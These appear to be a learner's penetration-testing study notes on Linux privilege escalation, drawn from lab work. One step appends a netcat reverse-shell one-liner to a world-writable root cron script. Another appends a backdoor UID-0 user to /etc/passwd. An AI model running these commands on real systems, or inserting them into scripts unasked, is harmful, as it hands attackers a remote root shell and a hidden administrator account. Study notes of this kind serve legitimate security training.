---
title: Study Notes - 2021/05/09
date: 2021-05-09 17:34:43
tags: [Penetration Testing, Study Notes]
---

# Linux Privilege Escalation 
## Insecure file permissions  
## Cron based time job 

Inspect cron log for running jobs
```
grep "CRON" /var/log/cron.log  

Jan27 17:45:01 victim CRON[2615]:(root) CMD (cd /var/scripts/ && ./user_backups.sh)
Jan27 17:50:01 victim CRON[2631]:(root) CMD (cd /var/scripts/ && ./user_backups.sh)
Jan27 17:55:01 victim CRON[2656]:(root) CMD (cd /var/scripts/ && ./user_backups.sh)
Jan27 18:00:01 victim CRON[2671]:(root) CMD (cd /var/scripts/ && ./user_backups.sh)

```

run every 5 mins

ls -lah to show its permission (rwxrwxrwx)

add following to the script (See [Reverse-shell-Cheat-Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet))
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f 
```

## Insecure /etc/passwd Permission
if a password hash is present in the second column of a /etc/passwd user record, it is considered valid for authentication and it takes **precedence** over the respective entry in /etc/shadow if available

### Generate password hash
```
openssl passwd evil
AK24fcSx2Il3I

echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd

username:passwordhash:userid:groupid:
```

## Linux Kernel Vulnerabilities  

Lab machine: ssh n00b@10.11.0.129

inspecting the /etc/issue file  
```
uname -r 
-r, --kernel-release     print the kernel release
arch
```

```
searchsploit linux kernel ubuntu 16.04
```

## Compile C/C++ 
match the architecture of the target machine  


# Password Attacks  
## Standard wordlist  
Kali linux has some stored in `/usr/share/wordlists/`  
  
